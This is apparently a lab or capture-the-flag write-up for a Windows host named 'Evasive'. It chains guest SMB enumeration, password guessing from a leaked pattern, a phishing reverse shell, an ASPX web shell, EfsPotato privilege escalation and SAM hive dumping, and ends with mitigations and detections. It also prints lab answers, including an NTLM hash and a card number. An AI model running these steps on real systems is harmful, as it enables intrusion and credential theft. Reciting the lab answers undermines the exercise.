Core concept (one line)

Readable onboarding docs leak the password pattern; mail lets you phish a user who can write webroot; the IIS pool then potato’s to SYSTEM.

Introduction

Evasive is a multi-service Windows host (IIS, hMailServer, SMB, RDP). Start from guest SMB document shares, recover a year-tweaked default password, authenticate as roger to mail, phish alfonso with an AV-friendly reverse shell, then abuse writable wwwroot → ASPX as the app pool → EfsPotato → SAM dump. Lab questions also require a merger company name and a credit card from KeePass.

Root cause

Information disclosure (guest docs) + predictable password policy + user who can plant web content + classic SeImpersonate on IIS. Anti-bruteforce on mail forces intelligence-led password guessing, not spraying. 

guest SMB docs PDF
  → NewUser2024! pattern → live year NewUser2025!
  → roger POP3/SMTP/SMB

Step 1: Service map

Why we do this: This box is multi-protocol; the attack surface is mail + web + SMB, not only RDP.
nmap -Pn -n -sV -sC -p 25,80,110,135,139,143,445,587,3389 10.1.84.198

What you should see: hMailServer SMTP/POP3, IIS 10 on 80, SMB, RDP. Host winserver01.hs.

Step 2: Guest SMB → onboarding PDFs

Why we do this: Guest/read shares often hold the exact strings users were told to use as first passwords.
nxc smb 10.1.84.198 -u guest -p '' --shares
# spider docs share; pull old_user_setup_doc.pdf / mail_doc.pdf

PDF describes default style NewUser2024!. Live passwords used the current year:

roger / NewUser2025!

Do not brute mail — anti-bruteforce will lock the path. Use the doc pattern + year tweak.

Step 3: Roger mail + internal phish to alfonso

Why we do this: Mail auth proves the password and gives a channel to deliver a payload to a higher-value interactive user.
# POP3/SMTP as roger:NewUser2025!
# Craft phishing mail with Go reverse shell (lab-friendly / AV-tolerant)
# Catch shell as alfonso; reset/confirm NewUser2025!x style if needed for RDP

Step 4: Company answer + webroot write

Why we do this: Lab scoring asks which company is being bought; the same user context can plant IIS content.
# Read merger_info.pdf from alfonso-accessible paths
# Answer: AI is the Future Corp
# Write ASPX shell under IIS wwwroot (where alfonso has write)
Company: AI is the Future Corp

Step 5: IIS app pool → SeImpersonate → EfsPotato → SYSTEM

Why we do this: Default app-pool tokens often hold SeImpersonate. Potato-family tools turn that into SYSTEM without a kernel bug.
# Trigger ASPX → shell as IIS APPPOOL\...
whoami /priv   # expect SeImpersonatePrivilege
# EfsPotato (or peer) → NT AUTHORITY\SYSTEM
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# pull hives; secretsdump.py -sam sam.save -system system.save LOCAL
Administrator NTLM: 4366ec0f86e29be2a4a5e87a1ba922ec

Step 6: KeePass credit card

Why we do this: Lab final question — secrets in an unlocked KeePass on the user session.
# RDP as alfonso; KeePass process/session already unlocked in lab state
# Read compromised user card
Credit card: 1234-5555-6666-8521

Security impact

  • Guest share → full SYSTEM via realistic internal kill chain
  • Cleartext-equivalent admin NTLM for pass-the-hash
  • PII (card) from password manager residue on interactive session

Mitigation

  • Disable guest SMB; never put password policy examples on open shares.
  • Force unique first passwords + mandatory change; no year-suffix patterns.
  • Harden mail (MFA, phishing controls); do not allow users to write IIS roots.
  • Run app pools without SeImpersonate where possible; isolate sites; patch potato classes with token filtering / hardened services.
  • Lock KeePass when idle; never leave vaults unlocked on shared consoles.
  • Note: remote admin token after local admin add may need LocalAccountTokenFilterPolicy awareness — fix the privilege model, do not rely on the filter as security theater alone.

Beyond Root

Blue team — stop the vuln

  • Alert on guest SMB document reads of HR/IT PDFs.
  • Detect ASPX drops under wwwroot and reg save of SAM/SYSTEM.
  • Parent-child: w3wp.exe → potato / cmd / powershell.

Conclusion

Evasive rewards patient OSINT on shares and careful phishing over noisy sprays. Once web write lands, classic IIS impersonation PE ends the host. The “answers” are just structured loot from the same chain.
